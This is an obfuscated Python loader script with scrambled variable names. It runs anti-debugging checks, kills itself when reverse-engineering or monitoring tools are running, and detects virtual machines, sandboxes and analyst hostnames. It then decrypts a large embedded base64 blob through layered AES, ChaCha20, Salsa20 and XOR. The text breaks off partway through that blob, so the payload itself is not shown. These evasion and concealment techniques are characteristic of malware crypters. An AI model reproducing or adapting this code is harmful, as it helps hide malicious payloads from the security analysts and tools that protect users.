#!/usr/bin/env python3
import sys, os, time, threading, gc, platform, socket, random, secrets, base64, hashlib
from datetime import datetime
from Crypto.Cipher import AES, ChaCha20, Salsa20
from Crypto.Protocol.KDF import scrypt

O_ll0oO0ooO0lOIl0_o0 = bytes.fromhex('a79a471ca258f282e4c20590c1ce778b513807ac849a5d48f438a3f0986ac2d025296ba31da19ff363209cea3ff10ee605c55bdc420abc0c9ab50b15b222a043')
IolllOo0OloO0oI0_O0o = 0
OI0olOOOl1OoO_l0oOl1 = [secrets.randbits(64) for _ in range(12)]
OIl0OoO0lOIl0O0O0oII = {'last_check': time.time(), 'violations': 0, 'session_start': time.time()}
o0OIl0Ol0oOIl1OoIlII = [threading.Event() for _ in range(3)]

def ol0_o0OOl0oOIIlOIl0o():
    global OI0olOOOl1OoO_l0oOl1, OIl0OoO0lOIl0O0O0oII
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        OI0olOOOl1OoO_l0oOl1[0] ^= 0xDEADBEEF
        raise RuntimeError("Debugger detected")
    try:
        frame = sys._getframe()
        if frame.f_trace is not None or frame.f_back.f_trace is not None:
            raise RuntimeError("Debugger frame detected")
    except:
        pass
    measurements = []
    for _ in range(5):
        start = time.perf_counter_ns()
        dummy = sum(i * random.randint(1, 100) for i in range(3000))
        elapsed = time.perf_counter_ns() - start
        measurements.append(elapsed)
    avg_time = sum(measurements) / len(measurements)
    if avg_time > 150_000_000 or max(measurements) > 300_000_000:
        raise RuntimeError("Timing anomaly detected")
    obj_count = len(gc.get_objects())
    if obj_count > 500000 or obj_count < 500:
        raise RuntimeError("GC anomaly detected")
    suspicious_env = ['PYTHONDEBUG', 'PYTHONINSPECT', 'PYTHONHOME', '_DEBUG']
    if any(var in os.environ for var in suspicious_env):
        raise RuntimeError("Suspicious environment detected")
    try:
        import psutil
        current_proc = psutil.Process()
        if current_proc.memory_info().rss > 2 * 1024 * 1024 * 1024:
            raise RuntimeError("Memory limit exceeded")
        parent = current_proc.parent()
        if parent and any(debugger in parent.name().lower() 
                         for debugger in ['ida', 'olly', 'x64dbg', 'ghidra', 'radare', 'gdb']):
            raise RuntimeError("Debugger process detected")
        dangerous_processes = [
            'ida', 'ida64', 'ollydbg', 'x32dbg', 'x64dbg', 'windbg', 'ghidra',
            'radare2', 'r2', 'gdb', 'lldb', 'wireshark', 'processhacker',
            'cheatengine', 'artmoney', 'debugview', 'procmon', 'regmon',
            'filemon', 'apimonitor', 'detours', 'apihook', 'hookapi'
        ]
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            if any(tool in proc_name for tool in dangerous_processes):
                raise RuntimeError("Security tool detected")
    except ImportError:
        pass
    except:
        pass
    OIl0OoO0lOIl0O0O0oII['last_check'] = time.time()
    OI0olOOOl1OoO_l0oOl1[random.randint(0, len(OI0olOOOl1OoO_l0oOl1)-1)] ^= random.randint(1, 0xFFFF)

def oO_lol1Oool1Ooo0lOl1():
    vm_signatures = [
        'vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels',
        'hyperv', 'hyper-v', 'kvm', 'bochs', 'wine', 'docker', 
        'kubernetes', 'sandboxie', 'cuckoo', 'anubis', 'joebox',
        'threatexpert', 'cwsandbox', 'comodo', 'sunbelt', 'gfi'
    ]
    system_info = (platform.system() + platform.machine() + 
                  platform.processor() + platform.platform()).lower()
    if any(sig in system_info for sig in vm_signatures):
        raise RuntimeError("VM environment detected")
    try:
        hostname = socket.gethostname().lower()
        suspicious_hostnames = vm_signatures + [
            'sandbox', 'malware', 'analysis', 'test', 'victim', 'sample',
            'honeypot', 'research', 'analyst', 'reverse', 'debug'
        ]
        if any(name in hostname for name in suspicious_hostnames):
            raise RuntimeError("Suspicious hostname detected")
    except:
        pass
    try:
        start = time.perf_counter()
        for _ in range(200000):
            _ = random.random() ** 0.5
        cpu_time = time.perf_counter() - start
        if cpu_time > 1.0:
            raise RuntimeError("CPU timing anomaly detected")
        start = time.perf_counter()
        data = [random.randint(0, 1000000) for _ in range(50000)]
        data.sort()
        memory_time = time.perf_counter() - start
        if memory_time > 0.5:
            raise RuntimeError("Memory timing anomaly detected")
    except:
        pass
    vm_files = [
        '/proc/vz', '/proc/bc', '/.dockerenv', '/.dockerinit',
        '/usr/bin/VBoxControl', '/usr/bin/VBoxService',
        'C:\\windows\\system32\\drivers\\VBoxMouse.sys',
        'C:\\windows\\system32\\drivers\\vmhgfs.sys'
    ]
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            raise RuntimeError("VM files detected")

def OO0oIol1OoIOIl0_oI1l(purpose: str, length: int) -> bytes:
    global O_ll0oO0ooO0lOIl0_o0
    salt = hashlib.sha256(purpose.encode()).digest()
    key_material = O_ll0oO0ooO0lOIl0_o0
    return scrypt(key_material, salt, length, N=2**16, r=8, p=1)

def IIOlo_lI1lO_OOooI_I(data: bytes) -> bytes:
    try:
        aes_key = OO0oIol1OoIOIl0_oI1l("AES_LAYER", 32)
        chacha_key = OO0oIol1OoIOIl0_oI1l("CHACHA_LAYER", 32)
        salsa_key = OO0oIol1OoIOIl0_oI1l("SALSA_LAYER", 32)
        xor_key = OO0oIol1OoIOIl0_oI1l("XOR_LAYER", 256)
        salsa_nonce = data[:8]
        encrypted_data = data[8:]
        xor_decrypted = bytes(a ^ b for a, b in zip(encrypted_data,
                            (xor_key * (len(encrypted_data) // len(xor_key) + 1))[:len(encrypted_data)]))
        salsa_cipher = Salsa20.new(key=salsa_key, nonce=salsa_nonce)
        chacha_data = salsa_cipher.decrypt(xor_decrypted)
        chacha_nonce = chacha_data[:12]
        chacha_encrypted = chacha_data[12:]
        chacha_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
        aes_data = chacha_cipher.decrypt(chacha_encrypted)
        aes_nonce = aes_data[:16]
        aes_tag = aes_data[16:32]
        aes_encrypted = aes_data[32:]
        aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=aes_nonce)
        return aes_cipher.decrypt_and_verify(aes_encrypted, aes_tag)
    except Exception:
        raise RuntimeError("Decryption failed")

def Io0ooO0lI0oll0oOIo0O():
    global IolllOo0OloO0oI0_O0o, OI0olOOOl1OoO_l0oOl1, OIl0OoO0lOIl0O0O0oII
    expected_violations = OIl0OoO0lOIl0O0O0oII.get('violations', 0)
    current_violations = sum(1 for canary in OI0olOOOl1OoO_l0oOl1 if canary & 0xFFFF == 0)
    if abs(current_violations - expected_violations) > 5:
        raise RuntimeError("Integrity check failed")
    pass
    IolllOo0OloO0oI0_O0o += 1
    pass
    session_duration = time.time() - OIl0OoO0lOIl0O0O0oII.get('session_start', time.time())
    if session_duration > 172800:
        raise RuntimeError("Session duration exceeded")


def Iol0oOlI0olOol_ol_oO():
    while True:
        sleep_time = random.uniform(1.5, 4.0)
        time.sleep(sleep_time)
        try:
            ol0_o0OOl0oOIIlOIl0o()
            oO_lol1Oool1Ooo0lOl1()
            Io0ooO0lI0oll0oOIo0O()
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(OI0olOOOl1OoO_l0oOl1) - 1)
                OI0olOOOl1OoO_l0oOl1[idx] ^= random.randint(1, 0xFFFFFFFF)
        except Exception as e:
            print(f"Security violation: {str(e)}")
            sys.exit(1)

def O_olI0ol0oOoO0ll0oOl():
    try:
        ol0_o0OOl0oOIIlOIl0o()
        oO_lol1Oool1Ooo0lOl1()
        Io0ooO0lI0oll0oOIo0O()
        o0OIl0Ol0oOIl1OoIlII[0].set()
        lo00lllIllI0oIlOIo0O = base64.b64decode('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